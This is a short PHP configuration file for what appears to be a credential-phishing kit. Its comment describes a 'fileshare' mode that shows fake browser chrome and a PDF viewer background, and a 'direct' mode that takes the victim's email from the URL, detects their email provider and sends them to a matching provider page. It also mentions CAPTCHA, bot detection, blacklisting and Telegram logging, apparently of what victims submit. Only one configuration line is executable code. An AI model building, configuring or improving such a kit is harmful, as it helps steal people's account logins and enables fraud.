<?php
/**
 * Application Mode Configuration
 * 
 * Controls how the app behaves after CAPTCHA verification.
 * 
 * APP_MODE options:
 *   'fileshare' - Default. Shows file share UI (PDF viewer background, fake browser
 *                 chrome, email verification container). Provider page loads in iframe.
 *                 This is the original behavior.
 * 
 *   'direct'    - Skips the file share UI entirely. After CAPTCHA verification,
 *                 the email is extracted, the provider is detected, and the user
 *                 is redirected straight to the correct provider page. No iframe,
 *                 no PDF background, no fake browser container.
 *                 All other functionality (CAPTCHA, bot detection, blacklist,
 *                 telegram logging, redirect after submission) remains intact.
 * 
 * IMPORTANT: The email MUST be present in the URL (?ref=...) for direct mode to
 * work. If no email is found, the user is redirected to the centralized redirect URL.
 */

define('APP_MODE', 'fileshare');
